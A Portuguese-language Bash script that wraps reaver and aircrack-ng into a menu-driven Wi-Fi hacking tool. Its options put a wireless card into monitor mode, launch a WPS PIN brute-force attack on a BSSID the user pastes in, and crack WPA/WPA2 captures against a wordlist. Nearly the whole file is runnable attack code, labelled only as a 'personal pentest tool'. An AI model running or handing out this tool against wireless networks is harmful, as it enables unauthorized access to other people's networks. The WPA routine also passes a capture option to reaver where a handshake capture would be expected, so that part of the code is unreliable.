#!/bin/bash
#Hack de Wifi contra WPS ativado
#WPA e WPA2 terá que usar uma wordlist
#programas utilizados: Reaver, Aircrack-ng, Airmon-ng
#www.flaviodeoliveira.com.br
#www.youtube.com/flaviodicas
#Flávio Oliveira 
#16/08/2016

if [[ `id -u` -ne 0 ]]; then
	echo
		zenity --info --text="Você precisa ter poderes administrativos (root)" && echo $?
		if [ $? -eq 1 ]; then
        exit 1
    fi
    exit 0
fi

#Criei variaveis para as cores. Isso facilita a visualização do código depois
#A variavel "normal" ela serve para voltar a cor padrão do shell.
verde="\033[1;32m"
azul="\033[1;34m"
vermelho="\033[1;31m"
branco="\033[0;37m"
NORMAL="\033[m"

testaconexao()
{
echo "Aguarde!!! Verificando conexão com a internet"
if ! ping -c 7 www.google.com.br 1>/dev/null 2>/dev/stdout; then
	echo "Alguns módulos desse script precisa de conexão com a internet para serem executado"
	sleep 3
	read -p "Deseja refazer o teste de conexão? s/n: " -n1 escolha
	case $escolha in
			s|S) echo
				clear
				testaconexao
				;;
			n|N) echo
				echo Voltando ao Menu Principal ...
				sleep 2
				menu
				exit
				;;
			*) echo
				echo Alternativas incorretas ... Saindo!!!!
				exit
				;;
	esac
else
	echo "Teste de conexão está ok"
	sleep 1

fi
}

programasnecessarios()
{
clear
	if which -a aircrack-ng 1>/dev/null 2>/dev/stdout && which -a reaver 1>/dev/null 2>/dev/stdout; then
		echo -e "${azul}Você já possui os programas AIRCRACK-NG E REAVER${NORMAL}" && sleep 2 
		menu
	else
		echo "${azul}Para continuar, você precisa instalar alguns programas (aircrack-ng e reaver)${NORMAL}"
		read -n1 -p "sim ou não (S ou N)" escolha
		case $escolha in
		s|S)echo
			testaconexao && apt-get install aircrack-ng reaver pv -y 1>/dev/null 2>/dev/stdout
			;;
		n|N)echo
			echo "Voltando ao MENU PRINCIPAL" && sleep 1
			menu
			;;
		*)echo
			echo "Alternativas inválidas" && programasnecessarios
			;;
		esac
	fi

} 

resetplaca()
{
clear
	echo "Placas de Redes"
	iwconfig && sleep 3

	if  ifconfig | grep "mon0"; then
		iw dev mon0 del && menu	
	elif ifconfig | grep 'mon1'; then
		iw dev mon1 del && menu
	elif ifconfig | grep 'mon2'; then
		iw dev mon2 del && menu
	elif ifconfig | grep 'mon3'; then
		iw dev mon3 del && menu
	elif ifconfig | grep 'mon4'; then
		iw dev mon4 del && menu
	else
		echo "${azul}Não há nenhuma placa em modo captura${NORMAL}"
		menu
	fi
}

ataqueWPS()
{
	if ifconfig | grep 'wlp8s0'; then
		ifconfig wlp8s0 down
		airmon-ng start wlp8s0 2>/dev/stdout && sleep 2 && airodump-ng mon0 2>/dev/stdout && sleep 1 
		echo "reaver -i mon0 -b BSSID -vv"
		read -n15 -p "cole aqui.:   " bssid
		reaver -i mon0 -b $bssid -vv
	else
		ifconfig wlan0 down
		airmon-ng start wlan0 2>/dev/stdout && sleep 2 && airodump-ng mon0 2>/dev/stdout && sleep 1
		echo "reaver -i mon0 -b BSSID -vv"
		read -n15 -p "cole aqui.:    " bssid
		reaver -i mon0 -b $bssid -vv
	fi
}
ataqueWPA()
{
	
	if ifconfig | grep 'wlp8s0'; then
		ifconfig wlp8s0 down
		airmon-ng start wlp8s0 2>/dev/stdout && sleep 2 && airodump-ng mon0 2>/dev/stdout && sleep 30 
		echo "reaver -i mon0 -b BSSID -vv"
		read -n15 -p "cole aqui.:   " bssid
		reaver -i mon0 -b $bssid --write quebrawpa.cap
		aircrack-ng quebrawpa.cap wordlistFlavio.list
	else
		ifconfig wlan0 down
		airmon-ng start wlan0 2>/dev/stdout && sleep 2 && airodump-ng mon0 2>/dev/stdout && sleep 30
		echo "reaver -i mon0 -b BSSID -vv"
		read -n15 -p "cole aqui.:    " bssid
		reaver -i mon0 -b $bssid --write quebrawpa.cap
		aircrack-ng quebrawpa.cap wordlistFlavio.list
	fi
}

menu()
{
clear
echo -e "${azul}########################################################################${NORMAL}
${azul}#${verde} | HACK WIRELESS | == Flávio Oliveira (ferramenta pentest pessoal) == ${NORMAL}${azul}#${NORMAL}
${azul}#${NORMAL}								       ${NORMAL}${azul}#${NORMAL} 
${azul}################ MENU PRINCIPAL ########################################${NORMAL}"
echo
echo -e "1 --> ${azul}Resetar Placa de Rede (modo captura)${NORMAL}"
echo
echo -e "2 --> ${azul}Começar Ataque WPS${NORMAL}"
echo
echo -e "3 --> ${azul}Ataque WPA/WPA2 com Wordlist${NORMAL}"
echo
echo -e "4 --> ${azul}Verificar Programas Necessários${NORMAL}"
echo
echo -e "0 --> ${azul}Sair${NORMAL}"
echo
read -n1 -p "Escolha uma das opções acima.:  " -s escolha
	case $escolha in
	1)echo
		resetplaca
		;;
	2) echo
		ataqueWPS
		;;
	3) echo
		ataqueWPA
		;;
	4) echo
		programasnecessarios
		;;
	0) echo
		clear && exit
		;;
	*) echo
		echo "Opções inválidas"
		sleep 1 && menu
		;;
	esac
}
menu



